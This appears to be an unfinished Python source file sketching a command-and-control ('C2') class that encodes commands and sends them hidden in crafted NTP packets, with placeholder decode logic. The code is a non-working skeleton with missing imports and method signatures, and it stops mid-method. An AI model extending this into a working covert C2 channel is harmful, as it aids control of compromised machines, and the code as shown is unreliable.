import server.convert

class C2:
    def __init__(self, ipaddr, osys):
        self.ipaddr = ipaddr
        self.osys = osys

    #send given cmd to API for conversion
    def convertCMD(cmd):
        return convert.encode(cmd)

    #receive output and decode, return to TS/(DB)?
    def receiveOutput(output):
        return convert.decode(output)
    
    #send command via NTP message, craft mal packet
    def sendCMD(cmd):
        encoded = convertCMD(cmd)
        cPacket = packets.CommandPacket()
        